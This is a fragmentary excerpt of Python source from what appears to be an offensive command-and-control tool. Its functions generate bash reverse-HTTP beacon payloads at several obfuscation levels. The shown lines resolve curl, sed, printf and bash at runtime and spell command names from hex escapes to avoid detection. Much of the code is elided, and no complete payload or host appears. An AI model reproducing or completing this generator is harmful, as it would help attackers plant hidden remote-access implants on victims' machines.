...
def generate_bash_reverse_http(ip, port, obs, beacon_interval):
    ...
    if obs == 0:
        ...
        print(
            brightred + f"[!] Unsupported obfuscation level was selected use levels 1-3"
        )
...
def generate_bash_reverse_http_obs2(beacon_url: str, interval: int) -> str:
    ...
    # ─── 1) resolve commands ────────────────────────────────────────────────────────
    parts.append(
        f"""CC=$(which curl); SD=$(which sed); PR=$(which printf); BS=$(which bash)"""
    )
...
def generate_bash_reverse_http_obs3(beacon_url, interval):
    ...
    parts.append(
        r"S=$(printf '\x73'); E=$(printf '\x65'); D=$(printf '\x64'); SD=" "$S$E$D" ""
    )
    parts.append(
